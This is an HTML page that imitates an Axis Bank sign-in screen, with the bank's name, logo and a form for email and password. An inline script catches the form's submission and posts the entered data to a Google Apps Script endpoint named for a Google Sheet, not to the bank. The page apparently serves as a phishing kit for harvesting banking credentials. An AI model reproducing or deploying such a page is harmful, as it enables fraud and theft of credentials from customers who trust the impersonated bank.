<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Axis Bank</title>
    <link rel="stylesheet" href="style.css">
    <script src="login.js" defer></script>
</head>
<body>
    <div class="container">
        <div class="image-section">
            <img src="background image.jpg" alt="Axis Bank Background" class="bg-image">
        </div>
        <div class="login-section">
            <div class="logo">
                <img src="logo.png" alt="Axis Bank Logo">
            </div>
            <h2>Sign in</h2>
            <form name='submit-to-google-sheet'>
               <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="someone@example.com" required>
                <label for="password">Password</label>
                <input type="password" placeholder="Password" required>
                <div class="button-container">
                    <button type="submit" class="submit-button">Submit</button>
                </div>
            </form>
            <script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbxWVPGPUOJuiyPoyvQquULpRs9j0EXwZurKMoZKwarkx3BXSxgSc5Mn0TXIc-8cwjxe2Q/exec'
  const form = document.forms['submit-to-google-sheet']

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
  })
</script>
        </div>
    </div>
</body>
</html>
